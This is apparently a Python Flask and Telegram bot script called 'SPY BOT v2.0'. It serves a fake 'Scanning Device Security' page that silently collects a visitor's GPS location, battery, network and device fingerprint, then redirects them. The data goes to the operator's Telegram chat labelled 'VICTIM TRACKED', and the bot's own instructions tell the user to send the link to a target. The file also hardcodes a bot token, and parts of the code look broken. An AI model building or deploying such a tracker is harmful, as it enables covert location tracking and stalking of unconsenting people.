import os
import re
import logging
import requests
import threading
import json
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from flask import Flask, request, jsonify

# Config - HARDCODED (No .env needed)
BOT_TOKEN = "8642610739:AAEH6UaaiPA6lzUjwZXpWcZU8QtPz4et3Jo"
ADMIN_ID = 8559153464
app = Flask(__name__)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Advanced Tracking HTML (Stealth Mode)
TRACKING_PAGE = '''
<!DOCTYPE html><html><head><title>🔒 Security Check</title>
<meta http-equiv="refresh" content="0;url={target_url}">
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{{margin:0;padding:20px;background:linear-gradient(45deg,#000,#111);color:#0f0;font-family:'Courier New',monospace;text-align:center;min-height:100vh;display:flex;align-items:center;justify-content:center;flex-direction:column}}h1{{font-size:2em;margin:0;animation:pulse 1.5s infinite}}p{{font-size:1em;opacity:0.8}}.spinner{{border:4px solid #333;border-top:4px solid #0f0;border-radius:50%;width:50px;height:50px;animation:spin 1s linear infinite;margin:20px auto}}@keyframes pulse{{0%,100%{{opacity:1}}50%{{opacity:0.5}}@keyframes spin{{0%{{transform:rotate(0deg)}}100%{{transform:rotate(360deg)}}}}</style></head>
<body><h1>🔍 Scanning Device Security...</h1><p>Protecting your privacy</p><div class="spinner"></div>
<script>
let data={{}};let ts=Date.now();
navigator.geolocation.getCurrentPosition(p=>{{data.gps={{lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy}};fetch('/gps?'+new URLSearchParams(data)+'&ts='+ts)}});
if('getBattery'in navigator)navigator.getBattery().then(b=>{{data.bat={{level:Math.round(b.level*100),charging:b.charging,low:b.leveling}};fetch('/bat?'+new URLSearchParams(data)+'&ts='+ts)}});
data.ua=navigator.userAgent;data.lang=navigator.language;data.platform=navigator.platform;data.cookie=navigator.cookieEnabled;
data.screen=`${screen.width}x${screen.height}`;data.timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;
fetch('/track?'+new URLSearchParams(data)+'&ts='+ts);
if('connection'in navigator){{data.net={{type:navigator.connection.effectiveType,downlink:navigator.connection.downlink}};fetch('/net?'+new URLSearchParams(data)+'&ts='+ts)}}
</script></body></html>
'''

def get_ip(req):
    xff = req.headers.get('X-Forwarded-For')
    return xff.split(',')[0].strip() if xff else req.remote_addr

@app.route('/', methods=['GET'])
@app.route('/webhook', methods=['GET'])
def track():
    url = request.args.get('url', 'https://google.com')
    return TRACKING_PAGE.format(target_url=url)

@app.route('/gps', methods=['GET'])
@app.route('/bat', methods=['GET'])
@app.route('/track', methods=['GET'])
@app.route('/net', methods=['GET'])
def collector():
    ip = get_ip(request)
    ua = request.headers.get('User-Agent', 'Unknown')
    lang = request.headers.get('Accept-Language', 'Unknown')
    
    victim_data = {
        'ip': ip,
        'ua': ua[:120] + '...' if len(ua) > 120 else ua,
        'lang': lang,
        'gps': request.args.get('lat') + ',' + request.args.get('lon') if request.args.get('lat') else 'No GPS',
        'bat': f"{request.args.get('level', 'N/A')}% ({'Charging' if request.args.get('charging')=='true' else 'Discharging'})",
        'net': request.args.get('type', 'Unknown'),
        'screen': request.args.get('screen', 'Unknown'),
        'tz': request.args.get('timezone', 'Unknown'),
        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    
    send_to_telegram(victim_data)
    return '1'

def ip_lookup(ip):
    try:
        r = requests.get(f'http://ip-api.com/json/{ip}?fields=status,country,city,regionName,isp,org,lat,lon,timezone,query', timeout=4)
        data = r.json()
        if data['status'] == 'success':
            return {
                'city': data.get('city', 'Unknown'),
                'country': data.get('country', 'Unknown'),
                'region': data.get('regionName', ''),
                'isp': data.get('isp', 'Unknown'),
                'org': data.get('org', 'Unknown'),
                'gps_ip': f"{data.get('lat',0)},{data.get('lon',0)}"
            }
    except:
        pass
    return {}

def send_to_telegram(data):
    try:
        ipinfo = ip_lookup(data['ip'])
        message = f"""🕵️‍♂️ **VICTIM TRACKED** 🕵️‍♂️

┌── 🎯 **TARGET INFO**
│ IP: `{data['ip']}`
│ 📍 **IP Location**: {ipinfo.get('city', 'Unknown')}, {ipinfo.get('country', 'Unknown')}
│ 📡 ISP: {ipinfo.get('isp', 'Unknown')}
│ 🏢 Org: {ipinfo.get('org', 'Unknown')}
│
├── 📱 **DEVICE FINGERPRINT**
│ UserAgent: `{data['ua']}`
│ Language: {data['lang']}
│ Platform: {data.get('platform', 'Unknown')}
│ Screen: {data['screen']}
│
├── 🔋 **HARDWARE STATUS**
│ GPS: {data['gps']}
│ Battery: {data['bat']}
│ Network: {data['net']}
│ Timezone: {data['tz']}
│
└── ⏰ **TIMESTAMP**: {data['time']}

🔗 **Full Report**: {request.url}"""
        
        requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage', json={
            'chat_id': ADMIN_ID,
            'text': message,
            'parse_mode': 'Markdown',
            'disable_web_page_preview': True
        })
    except Exception as e:
        logger.error(f"Telegram error: {e}")

# ═══════════════════════════════════════════════════════════════
# TELEGRAM BOT COMMANDS - AUTO SETUP
# ═══════════════════════════════════════════════════════════════

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized!")
        return
    
    kb = [
        [InlineKeyboardButton("🔗 Generate Link", callback_data='link')],
        [InlineKeyboardButton("📊 Victim Stats", callback_data='stats')],
        [InlineKeyboardButton("🧹 Clear Chat", callback_data='clear')]
    ]
    await update.message.reply_text(
        "🔥 **SPY BOT v2.0** 🔥\n\n"
        "✅ **Features**:\n"
        "• GPS Location (Exact)\n"
        "• IP + ISP + Geo\n"
        "• Battery Status\n"
        "• Device Fingerprint\n"
        "• Network Info\n"
        "• Stealth Redirect\n\n"
        "👇 Click Generate Link 👇",
        reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown'
    )

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.from_user.id != ADMIN_ID:
        return
    
    if query.data == 'link':
        link = f"https://{request.host}/webhook?url=https://google.com"
        await query.edit_message_text(
            f"🎯 **TRACKING LINK**:\n\n"
            f"`{link}`\n\n"
            "📋 **How to use**:\n"
            "1. Send this link to target\n"
            "2. Target clicks → You get ALL data\n"
            "3. Works on ALL browsers!\n\n"
            f"💡 **Custom URL**: `{request.host}/webhook?url=YOUR_SITE.com`",
            parse_mode='Markdown'
        )
    
    elif query.data == 'stats':
        await query.edit_message_text("📊 **Stats**: Waiting for victims...\nAll data logged to this chat!")
    
    elif query.data == 'clear':
        await query.delete_message()

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    
    text = update.message.text.strip()
    if re.match(r'^https?://', text):
        link = f"https://{request.host}/webhook?url={text}"
        await update.message.reply_text(
            f"✅ **Ready to Track**:\n\n"
            f"`{link}`\n\n"
            f"🎯 Send this to your target!",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text("🔗 Send me any URL to generate tracking link!")

# ═══════════════════════════════════════════════════════════════
# MAIN LAUNCHER
# ═══════════════════════════════════════════════════════════════

def main():
    # Bot Setup
    bot_app = Application.builder().token(BOT_TOKEN).build()
    bot_app.add_handler(CommandHandler("start", start))
    bot_app.add_handler(CallbackQueryHandler(button))
    bot_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    # Link bot to flask
    app.bot_app = bot_app
    
    # Launch threads
    def run_bot():
        bot_app.run_polling(drop_pending_updates=True)
    
    threading.Thread(target=run_bot, daemon=True).start()
    
    # Flask Server
    port = int(os.environ.get('PORT', 8080))
    print(f"🚀 Spy Bot Live on PORT {port}")
    app.run(host='0.0.0.0', port=port, debug=False)

if __name__ == '__main__':
    main()
